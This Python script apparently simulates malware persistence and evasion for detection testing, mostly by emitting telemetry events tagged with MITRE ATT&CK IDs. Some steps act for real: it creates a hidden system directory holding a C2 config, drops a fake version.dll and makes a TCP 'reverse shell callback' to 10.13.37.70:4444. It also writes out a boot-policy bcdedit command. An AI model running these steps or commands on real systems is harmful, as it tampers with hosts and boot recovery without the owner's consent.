"""Simulator Epsilon — deep persistence and evasion behavior.

Behaviors: service installation, DLL hijacking simulation, boot record modification attempt,
hidden file/directory creation, process injection, anti-analysis checks.

MITRE ATT&CK: T1543.003, T1574.001, T1542.003, T1564.001, T1055, T1497
"""

from __future__ import annotations

import json
import os
import random
import subprocess
import sys
from pathlib import Path

from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter

import socket


def main() -> int:
    set_phase("initialization")
    emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
         source_process="winlogon_e.exe", pid=os.getpid())

    # Phase 1: Anti-analysis checks
    set_phase("anti_analysis")
    env, env_reasons = check_environment()
    if env_reasons:
        emit("PROCESS", "ENVIRONMENT_CHECK",
             os.environ.get("COMPUTERNAME", "unknown"),
             "WARNING" if env != EnvSafety.CLEAN else "INFO",
             source_process="winlogon_e.exe",
             verdict=env.name, reasons=env_reasons)
    if env == EnvSafety.COMPROMISED:
        emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
             source_process="winlogon_e.exe", early_exit="COMPROMISED environment")
        return 0
    jitter(0.2, 0.2)

    # Phase 2: Service installation
    set_phase("service_persistence")
    svc_key = r"HKLM\SYSTEM\CurrentControlSet\Services\WinDefenderUpdate"
    emit("REGISTRY", "CREATE_KEY", svc_key, "CRITICAL",
         source_process="winlogon_e.exe",
         detail="Creating fake Windows service", technique_id="T1543.003")
    emit("REGISTRY", "SET_VALUE", svc_key + r"\ImagePath", "CRITICAL",
         source_process="winlogon_e.exe",
         value_data=r"C:\Windows\System32\drivers\wdupdate.sys",
         detail="Service binary path set", technique_id="T1543.003")
    emit("REGISTRY", "SET_VALUE", svc_key + r"\Start", "CRITICAL",
         source_process="winlogon_e.exe",
         value_data="0 (Boot)", detail="Service set to start at boot")
    jitter(0.2, 0.2)

    # Phase 3: DLL hijacking
    set_phase("dll_hijack")
    hijack_dll = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "version.dll"
    hijack_dll.write_bytes(b"MZ" + os.urandom(512))
    emit("FILE", "DLL_HIJACK", str(hijack_dll), "CRITICAL",
         source_process="winlogon_e.exe", size=514,
         detail="DLL hijack payload created (version.dll)", technique_id="T1574.001")
    emit("FILE", "WRITE_FILE", r"C:\Windows\System32\version.dll", "CRITICAL",
         source_process="winlogon_e.exe",
         detail="DLL placed in System32 search path", technique_id="T1574.001")

    # Phase 4: Hidden directory
    set_phase("hidden_files")
    hidden_dir = Path(r"C:\ProgramData") / ".hidden_config"
    hidden_dir.mkdir(parents=True, exist_ok=True)
    try:
        subprocess.run(["attrib", "+h", "+s", str(hidden_dir)], capture_output=True, timeout=5)
    except Exception:
        pass
    emit("FILE", "HIDDEN_FILE", str(hidden_dir), "WARNING",
         source_process="winlogon_e.exe",
         detail="Hidden system directory created", technique_id="T1564.001")
    config = hidden_dir / "persist.dat"
    config.write_text(json.dumps({"c2": "10.13.37.70", "interval": 30}))
    emit("FILE", "CREATE_FILE", str(config), "WARNING",
         source_process="winlogon_e.exe", detail="Persistence config written")
    jitter(0.2, 0.2)

    # Phase 5: Boot record modification
    if env != EnvSafety.SUSPICIOUS:
        set_phase("boot_persistence")
        emit("FILE", "BOOT_MODIFY", r"\\.\PhysicalDrive0", "CRITICAL",
             source_process="winlogon_e.exe",
             detail="MBR/VBR modification attempted", technique_id="T1542.003")
        emit("PROCESS", "CREATE_PROCESS", "bcdedit.exe", "CRITICAL",
             source_process="winlogon_e.exe",
             command="bcdedit /set {default} bootstatuspolicy ignoreallfailures",
             detail="Boot policy modification attempted", technique_id="T1542.003")

    # Phase 6: Process injection
    if env != EnvSafety.SUSPICIOUS:
        set_phase("process_injection")
        targets = ["explorer.exe", "svchost.exe", "lsass.exe"]
        for proc in targets:
            emit("PROCESS", "OPEN_PROCESS", proc, "CRITICAL",
                 source_process="winlogon_e.exe",
                 access_rights="PROCESS_ALL_ACCESS",
                 detail=f"Opening {proc} for injection", technique_id="T1055")
            emit("PROCESS", "WRITE_MEMORY", proc, "CRITICAL",
                 source_process="winlogon_e.exe",
                 detail=f"Writing shellcode to {proc} memory space", technique_id="T1055.001")
            emit("PROCESS", "CREATE_THREAD", proc, "CRITICAL",
                 source_process="winlogon_e.exe",
                 detail=f"Remote thread created in {proc}", technique_id="T1055.003")
            jitter(0.2, 0.2)

    # Phase 7: Network callback
    set_phase("c2_callback")
    emit("NETWORK", "CONNECT", "10.13.37.70:4444", "CRITICAL",
         source_process="winlogon_e.exe", protocol="TCP",
         detail="Reverse shell callback attempt", technique_id="T1071.001")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(("10.13.37.70", 4444))
        s.close()
    except Exception:
        pass

    emit("PROCESS", "EXIT_PROCESS", "winlogon_e.exe", "INFO",
         source_process="winlogon_e.exe", persistence_methods=4, injection_targets=len(targets))
    return 0


if __name__ == "__main__":
    sys.exit(main())
